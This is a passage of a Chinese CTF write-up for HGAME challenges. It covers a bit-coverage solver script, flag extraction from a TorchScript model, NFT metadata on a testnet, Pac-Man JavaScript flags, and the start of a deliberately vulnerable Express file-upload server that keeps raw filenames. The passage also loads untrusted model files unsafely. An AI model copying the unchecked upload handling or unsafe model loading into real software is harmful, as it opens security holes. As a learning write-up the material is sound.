class="string">&quot;00111011000011000000100100101000100100101000010001100111001000100001000&quot;</span>,</span><br><span class="line">    <span class="number">68</span>: <span class="string">&quot;01000110010101011100110101110010001111100011010000000101010100000010010&quot;</span>,</span><br><span class="line">    <span class="number">69</span>: <span class="string">&quot;11111010111000110100010000000010001101111010011010001100000011000001001&quot;</span>,</span><br><span class="line">    <span class="number">70</span>: <span class="string">&quot;00000010110101100100100011001011011001100000100010011111000011000001101&quot;</span>,</span><br><span class="line">    <span class="number">71</span>: <span class="string">&quot;00001100001110101000010111001100011100100010011100001010000000001000010&quot;</span>,</span><br><span class="line">    <span class="number">72</span>: <span class="string">&quot;01100000000011001001011100000101000110111000101100010101111000001010100&quot;</span>,</span><br><span class="line">    <span class="number">73</span>: <span class="string">&quot;00001000001010010000001101010110110000110111011011100101011110010110000&quot;</span>,</span><br><span class="line">    <span class="number">74</span>: <span class="string">&quot;01010010100000000111011110001000010110100001000111001101010100000010000&quot;</span>,</span><br><span class="line">    <span class="number">75</span>: <span class="string">&quot;11010000011000010100001010000111011010100001111010100100100000111110110&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步：将所有二进制字符串倒序处理</span></span><br><span class="line">reversed_data = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> hint_num, binary_str <span class="keyword">in</span> original_data.items():</span><br><span class="line">    reversed_str = binary_str[::-<span class="number">1</span>]  <span class="comment"># 字符串倒序核心操作</span></span><br><span class="line">    reversed_data[hint_num] = reversed_str</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：筛选满足条件的二进制串（每个位置都有1）</span></span><br><span class="line">bit_length = <span class="built_in">len</span>(<span class="built_in">next</span>(<span class="built_in">iter</span>(reversed_data.values())))  <span class="comment"># 获取二进制串长度（64位）</span></span><br><span class="line">covered_bits = [<span class="literal">False</span>] * bit_length  <span class="comment"># 标记每个位是否被覆盖（有1）</span></span><br><span class="line">selected_hints = []  <span class="comment"># 存储选中的Hint编号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有倒序后的二进制串，优先选择覆盖更多未标记位的串</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> <span class="built_in">all</span>(covered_bits):  <span class="comment"># 直到所有位都被覆盖</span></span><br><span class="line">    best_hint = <span class="literal">None</span></span><br><span class="line">    best_coverage = -<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> hint_num, binary_str <span class="keyword">in</span> reversed_data.items():</span><br><span class="line">        <span class="keyword">if</span> hint_num <span class="keyword">in</span> selected_hints:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 跳过已选中的</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 计算当前串能覆盖的未标记位数量</span></span><br><span class="line">        coverage_count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bit_length):</span><br><span class="line">            <span class="keyword">if</span> binary_str[i] == <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> covered_bits[i]:</span><br><span class="line">                coverage_count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 选择覆盖数最多的串</span></span><br><span class="line">        <span class="keyword">if</span> coverage_count &gt; best_coverage:</span><br><span class="line">            best_coverage = coverage_count</span><br><span class="line">            best_hint = hint_num</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将最优串加入选中列表，并更新覆盖标记</span></span><br><span class="line">    <span class="keyword">if</span> best_hint <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        selected_hints.append(best_hint)</span><br><span class="line">        selected_str = reversed_data[best_hint]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bit_length):</span><br><span class="line">            <span class="keyword">if</span> selected_str[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                covered_bits[i] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span>  <span class="comment"># 无可用串（理论上不会触发）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;倒序后的部分数据示例（Hint 51）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;原始: <span class="subst">&#123;original_data[<span class="number">51</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;倒序: <span class="subst">&#123;reversed_data[<span class="number">51</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n选中的Hint编号（满足所有位都有1）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(selected_hints)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证：检查所有位是否都被覆盖</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n验证结果：所有位是否都有1 -&gt;&quot;</span>, <span class="built_in">all</span>(covered_bits))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出选中的倒序后二进制串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n选中的倒序后二进制串：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> selected_hints:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hint <span class="subst">&#123;num&#125;</span>: <span class="subst">&#123;reversed_data[num]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/12/HGAME2025/image-20260213190840966.png" alt="image-20260213190840966"></p>
+<p>找到对应的提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hgamgko9CLgQSyzti1Dlu8r2mD5wda&#125;</span><br><span class="line">&#123;AuYoACLQa2zq3i691hNlCxrALma42</span><br><span class="line">e&#123;uYMkfo9i7L0gSCKWy3t69DNCbmDLH</span><br><span class="line">megk9CiLrKWyAqi9hN8rELm&#125;</span><br><span class="line">hm5Y9AL0gCaWy2zq6xRmCLEwdHa42&#125;</span><br><span class="line">&#123;AuYoACLQa2zq3i691hNlCxrALma42</span><br></pre></td></tr></table></figure>
+
+<p>根据这6条数据就能拼凑出flag。这里放一张大佬对应好的图</p>
+<p><img src="/2026/02/12/HGAME2025/image-20250212153328515.png" alt="image-20250212153328515"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Aug5YMkf3o99ACi7Lr0gQSCKaWy2Azq3ti691DhNlCbxu8rR2mCAD5LEwLdmHa42&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-314-线性走廊中的双生实体"><a href="#Level-314-线性走廊中的双生实体" class="headerlink" title="Level 314 线性走廊中的双生实体"></a><strong>Level 314 线性走廊中的双生实体</strong></h2><p>附件给的是pt文件，pt文件就可以当作压缩包解压看文件内容，解压后看代码</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyModel</span>(<span class="title class_ inherited__">Module</span>):</span><br><span class="line">  __parameters__ = []</span><br><span class="line">  __buffers__ = []</span><br><span class="line">  training : <span class="built_in">bool</span></span><br><span class="line">  _is_full_backward_hook : <span class="type">Optional</span>[<span class="built_in">bool</span>]</span><br><span class="line">  linear1 : __torch__.torch.nn.modules.linear.Linear</span><br><span class="line">  security : __torch__.SecurityLayer</span><br><span class="line">  relu : __torch__.torch.nn.modules.activation.ReLU</span><br><span class="line">  linear2 : __torch__.torch.nn.modules.linear.___torch_mangle_0.Linear</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self: __torch__.MyModel,</span></span><br><span class="line"><span class="params">    x: Tensor</span>) -&gt; Tensor:</span><br><span class="line">    linear1 = <span class="variable language_">self</span>.linear1</span><br><span class="line">    x0 = (linear1).forward(x, )</span><br><span class="line">    security = <span class="variable language_">self</span>.security</span><br><span class="line">    x1 = (security).forward(x0, )</span><br><span class="line">    relu = <span class="variable language_">self</span>.relu</span><br><span class="line">    x2 = (relu).forward(x1, )</span><br><span class="line">    linear2 = <span class="variable language_">self</span>.linear2</span><br><span class="line">    <span class="keyword">return</span> (linear2).forward(x2, )</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecurityLayer</span>(<span class="title class_ inherited__">Module</span>):</span><br><span class="line">  __parameters__ = []</span><br><span class="line">  __buffers__ = []</span><br><span class="line">  training : <span class="built_in">bool</span></span><br><span class="line">  _is_full_backward_hook : <span class="type">Optional</span>[<span class="built_in">bool</span>]</span><br><span class="line">  flag : <span class="type">List</span>[<span class="built_in">int</span>]</span><br><span class="line">  fake_flag : <span class="type">List</span>[<span class="built_in">int</span>]</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self: __torch__.SecurityLayer,</span></span><br><span class="line"><span class="params">    x: Tensor</span>) -&gt; Tensor:</span><br><span class="line">    _0 = torch.allclose(torch.mean(x), torch.tensor(<span class="number">0.31415000000000004</span>), <span class="number">1.0000000000000001e-05</span>, <span class="number">0.0001</span>)</span><br><span class="line">    <span class="keyword">if</span> _0:</span><br><span class="line">      _1 = annotate(<span class="type">List</span>[<span class="built_in">str</span>], [])</span><br><span class="line">      flag = <span class="variable language_">self</span>.flag</span><br><span class="line">      <span class="keyword">for</span> _2 <span class="keyword">in</span> <span class="built_in">range</span>(torch.<span class="built_in">len</span>(flag)):</span><br><span class="line">        b = flag[_2]</span><br><span class="line">        _3 = torch.append(_1, torch.<span class="built_in">chr</span>(torch.__xor__(b, <span class="number">85</span>)))</span><br><span class="line">      decoded = torch.join(<span class="string">&quot;&quot;</span>, _1)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Hidden:&quot;</span>, decoded)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bool</span>(torch.gt(torch.mean(x), <span class="number">0.5</span>)):</span><br><span class="line">      _4 = annotate(<span class="type">List</span>[<span class="built_in">str</span>], [])</span><br><span class="line">      fake_flag = <span class="variable language_">self</span>.fake_flag</span><br><span class="line">      <span class="keyword">for</span> _5 <span class="keyword">in</span> <span class="built_in">range</span>(torch.<span class="built_in">len</span>(fake_flag)):</span><br><span class="line">        c = fake_flag[_5]</span><br><span class="line">        _6 = torch.append(_4, torch.<span class="built_in">chr</span>(torch.sub(c, <span class="number">3</span>)))</span><br><span class="line">      decoded0 = torch.join(<span class="string">&quot;&quot;</span>, _4)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Decoy:&quot;</span>, decoded0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>是从 TorchScript 格式的 pt 模型中提取加密的整数列表，再按照模型内置的解密规则还原出字符串形式的 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import torch</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    model = torch.jit.load(&quot;entity.pt&quot;, weights_only=False)</span><br><span class="line">    print(&quot;✅ 模型加载成功（TorchScript格式）&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    model = torch.load(&quot;entity.pt&quot;, weights_only=False)</span><br><span class="line">    print(&quot;✅ 模型加载成功（兼容模式）&quot;)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    encrypted_flag = model.security.flag</span><br><span class="line">    encrypted_fake_flag = model.security.fake_flag</span><br><span class="line">except:</span><br><span class="line">    state_dict = model.state_dict()</span><br><span class="line">    encrypted_flag = state_dict[&quot;security.flag&quot;]</span><br><span class="line">    encrypted_fake_flag = state_dict[&quot;security.fake_flag&quot;]</span><br><span class="line"></span><br><span class="line">if isinstance(encrypted_flag, torch.Tensor):</span><br><span class="line">    encrypted_flag = encrypted_flag.tolist()</span><br><span class="line">if isinstance(encrypted_fake_flag, torch.Tensor):</span><br><span class="line">    encrypted_fake_flag = encrypted_fake_flag.tolist()</span><br><span class="line"></span><br><span class="line">real_flag = &quot;&quot;.join([chr(int(b) ^ 85) for b in encrypted_flag])</span><br><span class="line">fake_flag = &quot;&quot;.join([chr(int(c) - 3) for c in encrypted_fake_flag])</span><br><span class="line"></span><br><span class="line">print(&quot;\n🔑 解密结果：&quot;)</span><br><span class="line">print(f&quot;真实flag: &#123;real_flag&#125;&quot;)</span><br><span class="line">print(f&quot;诱饵flag: &#123;fake_flag&#125;&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;\n🚀 触发模型打印flag：&quot;)</span><br><span class="line">try:</span><br><span class="line">    input_dim = model.linear1.in_features</span><br><span class="line">except:</span><br><span class="line">    input_dim = 10</span><br><span class="line"></span><br><span class="line">input_trigger = torch.full((1, input_dim), 0.31415)</span><br><span class="line">model(input_trigger)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/12/HGAME2025/image-20260217194424290.png" alt="image-20260217194424290"></p>
+<h2 id="Level-729-易画行"><a href="#Level-729-易画行" class="headerlink" title="Level 729 易画行"></a><strong>Level 729 易画行</strong></h2><p>分析附件代码，考察的是区块链的知识，题目中给了一个地址0x74520Ad628600F7Cc9613345aee7afC0E06EFd84，<a target="_blank" rel="noopener" href="https://sepolia.etherscan.io/%E7%BD%91%E7%AB%99%E4%B8%8A%E6%90%9C%E7%B4%A2%E4%B8%80%E4%B8%8B%E5%9C%B0%E5%9D%80">https://sepolia.etherscan.io/网站上搜索一下地址</a></p>
+<p><img src="/2026/02/12/HGAME2025/image-20260221101110537.png" alt="image-20260221101110537"></p>
+<p>看最下面的那一条</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260221101815231.png" alt="image-20260221101815231"></p>
+<p>有两条记录，铸造和转移，一般来说对于一个NFT而言，它的Metadata只会在铸造的</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260221102119810.png" alt="image-20260221102119810"></p>
+<p>web访问这个地址得到flag</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260221102644245.png" alt="image-20260221102644245"></p>
+<p>flag{Tr4d1ng_on_t3st_n3t}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a><strong>Level 24 Pacman</strong></h2><p>考察的是前端的题目，禁用了一些快捷方式，先看网页源代码，在url前面加上view-source:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Pac-Man<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;shortcut icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;favicon.png&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./static/style/index.css&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod-panel&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Pac-Man<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bd&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;canvas&quot;</span> <span class="attr">width</span>=<span class="string">&quot;960&quot;</span> <span class="attr">height</span>=<span class="string">&quot;640&quot;</span>&gt;</span>不支持画布<span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ft&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">p</span>&gt;</span>按 [空格键] 暂停或继续<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">p</span>&gt;</span>Press [space] to pause or continue<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">p</span>&gt;</span>Powered by passer-by<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./static/script/game.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./static/script/index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&quot;https://buttons.github.io/buttons.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>关键就在那三个js文件，这里就不放那三个文件了，分析之后就是通关就会得到flag，通关时会执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&#x27;here is your gift:aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>现base64解码然后随波逐流分析</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260221192359140.png" alt="image-20260221192359140"></p>
+<p>hgame{pratice_makes_perfect}，没想到flag是假的。再次压力ai得知这一题有两种flag，是根据游戏结束时的分数还有挑战次数决定回显哪一种flag</p>
+<p>SCORE 比较高（通常 &gt; 某个阈值，比如 9999 或 27000 左右，具体取决于剩余生命加成）<br>→ 显示：<br>here is your gift:aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ&#x3D;&#x3D;<br>解码后：haepaiemkspretgm{rtc_ae_efc}<br>SCORE 比较低（没达到阈值）<br>→ 显示：<br>here is your gift:aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0&#x3D;<br>解码后：haeu4epca_4trgm{_r_amnmse}</p>
+<p>这一题的flag对应第二种情况</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260221193736093.png" alt="image-20260221193736093"></p>
+<h2 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a><strong>Level 47 BandBomb</strong></h2><p>首先分析题目给的代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置模板引擎为 EJS</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态资源托管：/static 路径映射到项目根目录的 public 文件夹</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"><span class="comment">// 解析 JSON 格式的请求体（用于重命名接口接收 JSON 数据）</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="comment">// 检查 uploads 目录是否存在，不存在则创建</span></span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 回调函数指定文件上传的目标目录</span></span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 保留文件原始名称作为上传后的文件名</span></span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 校验文件名是否有效</span></span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 校验通过，允许上传</span></span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="comment">// 捕获异常，拒绝上传</span></span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 确保 uploads 目录存在（兜底逻辑）</span></span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 读取 uploads 目录下的所有文件</span></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, 